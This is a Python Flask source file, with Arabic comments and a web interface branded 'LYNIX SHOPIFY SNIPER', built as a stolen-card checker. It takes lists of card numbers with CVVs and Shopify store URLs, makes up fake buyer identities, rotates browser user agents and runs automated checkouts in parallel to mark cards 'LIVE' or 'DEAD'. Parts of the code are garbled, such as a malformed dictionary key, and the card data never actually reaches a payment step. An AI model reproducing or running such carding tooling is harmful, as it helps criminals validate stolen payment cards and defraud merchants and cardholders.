import requests
import re
import random
import string
from flask import Flask, render_template_string, request, jsonify
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

app = Flask(__name__)

# ترويسات متطورة لمحاكاة متصفحات مختلفة (Browser Rotation)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
]

def get_fake_identity():
    first = "".join(random.choices(string.ascii_lowercase, k=5))
    last = "".join(random.choices(string.ascii_lowercase, k=7))
    return {
        "email": f"{first}{random.randint(10,99)}@{last}.com",
        "first": first.capitalize(),
        "last": last.capitalize(),
        "street": f"{random.randint(100, 999)} Main St",
        "city": "New York", "zip": "10001", "state": "NY"
    }

def check_gate(site, cc):
    session = requests.Session()
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    identity = get_fake_identity()
    
    try:
        # 1. سحب أرخص منتج عبر JSON (شبر شبر)
        p_res = session.get(urljoin(site, "/products.json?limit=5"), timeout=10)
        products = p_res.json()['products']
        variants = [{'id': v['id'], 'price': float(v['price'])} for p in products for v in p['variants']]
        target = min(variants, key=lambda x: x['price'])['id']

        # 2. الإضافة للسلة
        session.post(urljoin(site, "/cart/add.js"), data={'id': target, 'quantity': 1})

        # 3. تجاوز الشحن والوصول للبوابة (Checkout Bypass)
        check_payload = {
            "checkout[email]": identity['email'],
            "checkout[shipping_address][first_name]": identity['first</td>'],
            "checkout[shipping_address][last_name]": identity['last'],
            "checkout[shipping_address][address1]": identity['street'],
            "checkout[shipping_address][city]": identity['city'],
            "checkout[shipping_address][zip]": identity['zip'],
            "checkout[shipping_address][country]": "United States",
            "checkout[shipping_address][province]": identity['state']
        }
        
        response = session.post(urljoin(site, "/checkout"), data=check_payload, timeout=15)

        # 4. تحليل النتيجة النهائية (Logic التحليلي)
        if "card_number" in response.text or "payment_gateway" in response.text:
            return {"cc": cc, "status": "LIVE", "msg": "Gate Open (APV)", "site": site}
        elif "insufficient_funds" in response.text:
            return {"cc": cc, "status": "LIVE", "msg": "Low Funds", "site": site}
        else:
            return {"cc": cc, "status": "DEAD", "msg": "Declined", "site": site}

    except Exception as e:
        return {"cc": cc, "status": "ERROR", "msg": "Connection Failed", "site": site}

@app.route('/')
def index(): return render_template_string(HTML_INTERFACE)

@app.route('/api/check', methods=['POST'])
def api_check():
    ccs = request.json.get('ccs', [])
    sites = request.json.get('sites', [])
    
    # توزيع المهام: كل بطاقة تجرب موقعاً عشوائياً من القائمة
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_gate, random.choice(sites), cc) for cc in ccs]
        results = [f.result() for f in futures]
    return jsonify(results)

HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX ULTIMATE V80</title>
    <style>
        body { background: #000; color: #95ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1000px; margin: auto; border: 2px solid #95ff00; padding: 20px; background: #050505; box-shadow: 0 0 30px #95ff0044; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        textarea { width: 100%; height: 180px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #95ff00; color: #000; font-weight: bold; border: none; cursor: pointer; margin-top: 15px; font-size: 1.2rem; }
        .stats { display: flex; justify-content: space-between; margin: 15px 0; border: 1px solid #222; padding: 10px; }
        #log { height: 350px; overflow-y: scroll; border: 1px solid #222; background: #000; padding: 10px; font-size: 13px; text-align: left; }
        .LIVE { color: #0f0; font-weight: bold; } .DEAD { color: #f00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ LYNIX SHOPIFY SNIPER V80 ]</h1>
        <div class="grid">
            <div>
                <h3>💳 Card List (CC|MM|YY|CVV)</h3>
                <textarea id="ccs" placeholder="4532..."></textarea>
            </div>
            <div>
                <h3>🔗 Shopify Pools (Sites)</h3>
                <textarea id="sites" placeholder="https://simplysheneka.net"></textarea>
            </div>
        </div>
        <button onclick="runHunter()">إطلاق القنص الجماعي ⚡</button>
        <div class="stats">
            <span>LIVE: <b id="live-count">0</b></span>
            <span>DEAD: <b id="dead-count" style="color:red">0</b></span>
        </div>
        <div id="log">بانتظار الأهداف...</div>
    </div>

    <script>
        let l=0, d=0;
        async function runHunter() {
            const ccs = document.getElementById('ccs').value.split('\\n').filter(x=>x);
            const sites = document.getElementById('sites').value.split('\\n').filter(x=>x);
            const log = document.getElementById('log');
            log.innerHTML = "⏳ جاري توزيع البطاقات على الـ Pools وبدء الفحص...<br>";

            const res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ ccs, sites })
            });
            const data = await res.json();
            
            data.forEach(item => {
                if(item.status === 'LIVE') l++; else d++;
                document.getElementById('live-count').innerText = l;
                document.getElementById('dead-count').innerText = d;
                log.innerHTML += `<div class="${item.status}">[${item.status}] ${item.cc} | GATE: ${item.site} | MSG: ${item.msg}</div>`;
            });
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
